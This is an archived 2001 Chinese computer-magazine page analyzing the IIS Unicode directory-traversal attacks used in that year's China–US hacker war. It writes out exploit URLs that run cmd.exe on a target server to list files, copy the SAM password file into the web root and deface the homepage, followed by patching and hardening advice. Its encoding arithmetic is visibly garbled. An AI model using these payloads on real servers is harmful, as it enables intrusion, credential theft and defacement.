@@ -1,0 +1,148 @@
+ 
+<html>
+<!-- #BeginTemplate "/Templates/internet.dwt" --> 
+<head>
+<!-- #BeginEditable "doctitle" --> 
+<title>中美黑客大战攻击手法分析</title>
+<!-- #EndEditable --> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<link rel="stylesheet" href="library/DNB/2001/0122/cpcw.css">
+</head>
+<body bgcolor="#FFFFFF" leftmargin="0" topmargin="2" marginwidth="0" marginheight="0">
+<table width="770" border="1" cellspacing="0" cellpadding="1" align="center" bordercolorlight="#CCCCCC" bordercolordark="#FFFFFF">
+  <tr> 
+    <td width="148" align="center"> <iframe src="http://www.lpzx.edu.cn/library/www.yesky.com/adj/html/cpcw-left.htm" width="140" height="60" frameborder="0" scrolling="no"></iframe> 
+    </td>
+    <td width="473" align="center" height="61"> 
+      <script language="JavaScript" src="http://www.lpzx.edu.cn/library/www.yesky.com/adj/js/cpcw.js"></script>
+    </td>
+    <td align="center" width="149"><iframe src="http://www.lpzx.edu.cn/library/www.yesky.com/adj/html/cpcw-right.htm" width="140" height="60" frameborder="0" scrolling="no"></iframe></td>
+  </tr>
+</table>
+<table width="770" border="0" cellspacing="0" cellpadding="0" align="center" height="22" bgcolor="#3366CC">
+  <tr> 
+    <td width="40" align="center" height="20"><img src="http://www.lpzx.edu.cn/library/DNB/2001/0122/images/b1.gif" width="14" height="14"></td>
+    <td width="583" height="20"> <span class="wj">| <a href="wrapup.html" class="wj"><font color="#FFFFFF">综合报道</font></a> 
+      | <a href="software.html"><font color="#FFFFFF">软件世界</font></a> 
+      | <a href="hardware.html"><font color="#FFFFFF">硬件周刊</font></a> 
+      | <a href="internet.html"><font color="#FFFFFF">互联网时代</font></a> 
+      | <a href="oa.html"><font color="#FFFFFF">OA专刊</font> 
+      </a>| <a href="game.html"><font color="#FFFFFF">游戏广场</font></a> 
+      | <a href="library/DNB/2001/0122/maket.html"><font color="#FFFFFF">评测与市场</font></a> 
+      | <a href="zt.html"><font color="#FFFFFF">专题版</font> 
+      </a>| <a href="library/DNB/default.htm"><font color="#FFFFFF">首页</font></a></span></td>
+    <td align="right" width="147" rowspan="2">&nbsp;</td>
+  </tr>
+</table>
+<table width="770" border="0" cellspacing="0" cellpadding="0" align="center" height="48">
+  <tr> 
+    <td width="174" valign="bottom"><a href="library/DNB/default.htm"><img src="tit.gif" width="169" height="68" border="0"></a></td>
+    <td width="448" class="nava"><span class="nava">严正声明<br>
+      　　未经许可，任何商业网站或个人网站都不得提供《电脑报》电子版的浏览或下载！违者我们将追究其法律责任！</span></td>
+    <td align="right" width="148" valign="top"><a href="library/www.yesky.com/default.htm"><img src="http://www.lpzx.edu.cn/library/www.yesky.com/newimages/news/logo.gif" width="140" height="60" border="0"></a></td>
+  </tr>
+</table>
+<table width="770" border="0" cellspacing="0" cellpadding="0" align="center" height="11">
+  <tr> 
+    <td width="169" rowspan="2" valign="top">&nbsp;</td>
+    <td width="141" rowspan="2" valign="top">&nbsp;</td>
+  </tr>
+  <tr> 
+    <td width="460" height="9"></td>
+  </tr>
+</table>
+<table width="770" border="0" cellspacing="0" cellpadding="0" align="center">
+  <tr> 
+    <td colspan="3" valign="top"> 
+      <table width="600" border="0" cellspacing="0" cellpadding="0" align="center">
+        <tr> 
+          <td class="nava"><font color="#FF9900">你所在的位置：&gt;&gt;<a href="library/DNB/default.htm">《电脑报》电子版</a> 
+            &gt;&gt;<a href="index.html">2001年<!-- #BeginEditable "%B5%DA%BC%B8%C6%DA" -->第22期<!-- #EndEditable --> 
+            </a>&gt;&gt;<a href="internet.html">互联网时代</a></font></td>
+        </tr>
+      </table>
+      <table width="430" border="0" cellspacing="0" cellpadding="0" align="center">
+        <tr> 
+          <td> 
+            <div align="center"><!-- #BeginEditable "%CE%C4%D5%C2%B1%EA%CC%E2" -->中美黑客大战攻击手法分析<!-- #EndEditable --></div>
+          </td>
+        </tr>
+      </table>
+      <table width="600" border="1" cellspacing="0" cellpadding="5" align="center" bordercolor="#FFCC99">
+        <tr> 
+          <td> 
+            <p><!-- #BeginEditable "%CE%C4%D5%C2%C4%DA%C8%DD" -->今年5月1日至5月7日的中美黑客大战，想必已给各位留下了深刻的印象，从双方黑客公布的攻击结果来看，多数主机都是 
+              Windows NT和Windows2000系统，这两个系统目前被利用最多的漏洞是IIS的Unicode目录遍历漏洞，据测试报告表明，目前中国有1/5的主机存在该漏洞。<br>
+              ##1一、 Unicode漏洞检测：<br>
+              Unicode漏洞编码在中文Windows NT中为：%c1%1c(代表0xc1- 0xc00x40 + 0x1c=0x5c='/')和%c0%2f(代表0xc0-0xc00x40+0x2f 
+              =0x2f='＼')。<br>
+              在英文版中为%c0%af(但%c1%pc、%c0%9v、%c0%qf、%c1%8s等几个编码也可能有效)。<br>
+              通过这几个编码我们可以通过在浏览器上获得有Unicode漏洞的机器文件控制权。<br>
+              简单检测办法是在浏览器里面输入：http//xxx．xxx．xxx．xxx/scripts/．．%c1%1c．．/winnt/system32/cmd．exe﹖/c+dir，如果显示：<br>
+              Directory of D＼Inetpub＼scripts<br>
+              01-05-02 0232a ＜DIR＞ ．<br>
+              01-05-02 0232a ＜DIR＞ ．．<br>
+              00-12-18 0550p ＜DIR＞<br>
+              samples<br>
+              ……<br>
+              说明网站存在该漏洞，如果不显示该页面，也可能是因为Scripts目录改名了，我们可以试着输入：<br>
+              http//xxx．xxx．xxx．xxx/msadc/．．%c1%1c．．/．．%c1%1c．．/．．%c1%1c．．/winnt/system32/cmd．exe﹖/c+dir如果显示像上面一样的目录，表明存在漏洞。(例子中xxx．xxx．xxx．xxx为服务器的IP地址，如何获得这里不多说了)<br>
+              如果还是示显示该页面，可用上述其它代码如：%c0%af代替%c1%1c试一试，或者你可以使用一段perl程序检测该漏洞(关于Perl程序这里不作讨论)。<br>
+              ##1<br>
+              二、 Unicode漏洞攻击<br>
+              通过Unicode漏洞可以使攻击者在浏览器执行DOS命令，如：<br>
+              http//xxx．xxx．xxx．xxx/scripts/．．%c1%1c．．/winnt/system32/cmd．exe﹖/c+dir+c<br>
+              这条命令将使服务器列出C盘所有目录文件。<br>
+              http//xxx．xxx．xxx．xxx/scripts/．．%c1%1c．．/winnt/system32/cmd．exe﹖+ 
+              copy+c＼winnt＼repair｜sam．＿+c＼inetpub＼wwwroot＼<br>
+              将使服务器执行一个复制C盘WinNT目录下的sam．＿到wwwroot文件夹的命令(sam．＿保存了经过加密的Windows 
+              NT系统密码文件，如果攻击者下载了这一文件，可以在本机用工具解得用户密码)。<br>
+              利用Echo命令即可通过浏览器直接更改网站的主页，如想修改c＼inetpub＼wwwroot＼index．asp，攻击者可以通过在浏览器的地址栏输入：<br>
+              http//xxx．xxx．xxx．xxx/scripts/．．%c1%1c．．/winnt/system32/cmd．exe﹖/c+echo+Your+Site+Has+Been+Hacked+ 
+              ＞c＼inetpub＼wwwroot＼index．aps<br>
+              攻击者还可以利用FTP、TFTP上载木马程序及提升管理权限的程序到被攻击服务器上，也可以通过建立BAT或者ASP文件直接获得系统权限，从而控制整个系统。<br>
+              ##1三、如何防范Unicode编码攻击<br>
+              Unicode编码漏洞最好的修补的方式是下载安装微软提供的补丁，下载地址是：<br>
+              IIS4．0补丁：http//www．microsoft．com/ntserver/nts/downloads/critical/q269862/default．asp<br>
+              IIS5．0补丁：http//www．microsoft．com/windows2000/downloads/critical/q269862/default．asp<br>
+              你可以通过查看winnt＼system32＼logfiles下的W3SVC1目录的log文件，确定是否有人利用Unicode编码漏洞攻击你的主机攻击(根据设置不同也可能在是W3SVC2或者W3SVC3目录下)。<br>
+              Unicode编码漏洞给网络安全管理员配置系统的几个启示，首先在安装Windwos NT系统的时候，不要按照系统的默认目录把Windwos 
+              安装在WinNT目录下面，把WinNT目录改名将使攻击者难于猜测命令执行目录；其次，应该把/WinNT/System32目录底下的cmd．exe和net．exe改名或者移除，这样攻击者就无法找到执行命令的文件；再者，应该把WEB服务器所有默认安装的执行目录删除，包括Samples、Scripts及Cgi-bin，这些目录如果被上传可执行文件，即可能对系统造成重大威胁，如果需要可执行目录，则自己可新建一个不与默认执行目录同名的目录；最后，网络管理员应该把系统日记文件目录移到一个更隐蔽的地方，这样攻击者就不易找到系统记录文件加以清除了。(小淘)<!-- #EndEditable --></p>
+          </td>
+        </tr>
+      </table>
+      <br>
+      <br>
+      <br>
+    </td>
+  </tr>
+</table>
+<table width="770" border="0" cellspacing="0" cellpadding="0" align="center" height="4" bgcolor="#FF9900">
+  <tr> 
+    <td width="161" bgcolor="#99CCFF"> </td>
+    <td width="610" bgcolor="#FF9900"></td>
+  </tr>
+</table>
+<table width="770" border="0" cellspacing="0" cellpadding="0" align="center">
+  <tr> 
+    <td> 
+      <div align="center"><a href="library/DNB/bill/index.html" target="_blank"></a><a href="library/DNB/hdong/gao.htm" target="_blank"> 
+        欢迎投稿 </a> | <a href="library/DNB/bill/index.html" target="_blank">广告联系</a>| <a href="library/DNB/serve/dnbjs.htm" target="_blank">关于我们</a>| 
+        <a href="library/DNB/maillist/index.html" target="_blank">电子杂志</a>| <a href="library/DNB/hdong/zaopin.html" target="_blank">加入我们</a>| 
+        <a href="library/DNB/hdong/xinsi.html" target="_blank">隐私条款</a></div>
+    </td>
+  </tr>
+</table>
+<table width="770" border="0" cellspacing="0" cellpadding="0" align="center">
+  <tr> 
+    <td> 
+      <div align="center"><span class="nava"><font color="#000000" face="Arial, Helvetica, sans-serif"> 
+        Copyright (C) 2000 Yesky.com, All Rights Reserved </font><font color="#000000"><br>
+        版权所有　 <font face="Arial, Helvetica, sans-serif"> Yesky </font><br>
+        <a href="mailto:webmaster@yesky.com"> 如有意见请与我们联系 </a></font></span></div>
+    </td>
+  </tr>
+</table>
+</body>
+<!-- #EndTemplate -->
+</html>
